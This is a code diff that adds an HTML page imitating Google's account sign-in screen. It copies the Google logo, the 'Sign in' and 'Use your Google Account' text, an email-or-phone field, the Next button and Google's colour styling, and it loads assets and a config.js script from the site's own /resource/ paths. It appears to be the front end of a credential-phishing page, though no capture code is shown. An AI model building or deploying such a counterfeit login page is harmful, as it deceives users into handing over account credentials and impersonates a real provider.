@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <script src="/resource/javascript/config.js"></script>
+    </head>
+    <style>
+        .google_logo {
+            width: 50px;
+            height: 50px;
+            background-image: url(/resource/image/google.png);
+            background-repeat: no-repeat;
+            background-size: cover;
+        }
+        .in {
+            width: 96%;
+            height: 55px;
+            background-color: white;
+            border-radius: 5px;
+            border: 1px solid var(--gm3-sys-color-on-surface, #1f1f1f);
+            outline: none;
+            font-size: 18px;
+            padding-left: 15px;
+        }
+        .btn_1 {
+            width: 80px;
+            height: 40px;
+            background-color: var(--gm3-sys-color-primary,#0b57d0);
+            color: white;
+            border: none;
+            border-radius: 25px;
+            
+        }
+    </style>
+    <body style="padding: 10px;">
+        <div id="page_1" style="display: block;">
+            <div class="google_logo"></div>
+            <br />
+            <div style="padding: 5px;">
+                <p style="font-size: 35px;padding: 0px;margin: 0px;font: bold 35px Arial, sans-serif;">Sign in</p>
+                <p>Use your Google Account</p>
+                <br />
+                <div align="center">
+                    <input class="in" placeholder="Email or phone" />
+                </div>
+                <P style="color: var(--gm3-sys-color-primary,#0b57d0);font: bold 16px Arial, sans-serif;;">Forgot email?</P>
+                <br />
+                <p>Not your computer? Use a Private Window to sign in. <a style="color: var(--gm3-sys-color-primary,#0b57d0);font: bold 16px Arial, sans-serif;;">Learn more 
+                about using Guest mode</a></p>
+                <div style="float: left;">
+                    <p style="margin-top: 10px;color: var(--gm3-sys-color-primary,#0b57d0);font: bold 16px Arial, sans-serif;">Create account</p>
+                </div>
+                <div style="float: right;">
+                    <button class="btn_1">Next</button>
+                </div>
+            </div>
+        </div>
+    </body>
+</html>
